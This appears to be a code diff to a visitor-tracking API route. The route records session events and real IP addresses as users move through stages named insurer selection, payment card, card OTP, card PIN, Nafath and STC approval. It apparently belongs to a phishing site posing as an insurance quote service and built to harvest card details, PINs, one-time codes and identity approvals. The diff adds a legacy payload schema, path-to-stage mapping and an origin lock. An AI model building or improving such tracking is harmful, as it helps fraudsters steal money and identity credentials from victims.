@@ -35,10 +35,32 @@ const BodySchema = z.object({
     .optional(),
 });
 
+const LegacyBodySchema = z.object({
+  sessionId: z.string().min(4).max(64),
+  event: z.string().min(1).max(40),
+  page: z.string().min(1).max(200).optional(),
+});
+
+function pageFromPath(path: string | undefined): z.infer<typeof PageEnum> {
+  const normalized = (path ?? "/").toLowerCase();
+  if (normalized.includes("insurer") || normalized.includes("compare")) return "insurer_selected";
+  if (normalized.includes("payment") || normalized.includes("card")) return "payment_card";
+  if (normalized.includes("otp")) return "card_otp";
+  if (normalized.includes("pin")) return "card_pin";
+  if (normalized.includes("phone")) return "phone_entry";
+  if (normalized.includes("motsl")) return "motsl_otp";
+  if (normalized.includes("nafath")) return "nafath";
+  if (normalized.includes("stc")) return "stc_awaiting";
+  return "quote_landing";
+}
+
+const ALLOWED_ORIGIN = "https://tmnbcre.lovable.app";
+
 const cors = {
-  "Access-Control-Allow-Origin": "*",
+  "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
   "Access-Control-Allow-Methods": "POST, OPTIONS",
   "Access-Control-Allow-Headers": "content-type",
+  Vary: "Origin",
 };
 
 export const Route = createFileRoute("/api/public/track")({
@@ -46,17 +68,30 @@ export const Route = createFileRoute("/api/public/track")({
     handlers: {
       OPTIONS: async () => new Response(null, { status: 204, headers: cors }),
       POST: async ({ request }) => {
+        const origin = request.headers.get("origin");
+        if (origin && origin !== ALLOWED_ORIGIN) {
+          return new Response("Origin not allowed", { status: 403, headers: cors });
+        }
         let json: unknown;
         try {
           json = await request.json();
         } catch {
           return new Response("Bad JSON", { status: 400, headers: cors });
         }
-        const parsed = BodySchema.safeParse(json);
-        if (!parsed.success) {
+        const currentPayload = BodySchema.safeParse(json);
+        const legacyPayload = LegacyBodySchema.safeParse(json);
+        if (!currentPayload.success && !legacyPayload.success) {
           return new Response("Invalid payload", { status: 400, headers: cors });
         }
-        const { sid, type, page, data } = parsed.data;
+        const payload = currentPayload.success
+          ? currentPayload.data
+          : {
+              sid: legacyPayload.data.sessionId,
+              type: legacyPayload.data.event === "submit" ? ("submit" as const) : ("visit" as const),
+              page: pageFromPath(legacyPayload.data.page),
+              data: undefined,
+            };
+        const { sid, type, page, data } = payload;
 
         // Capture the visitor's real IP (Cloudflare / proxy headers)
         const ip =
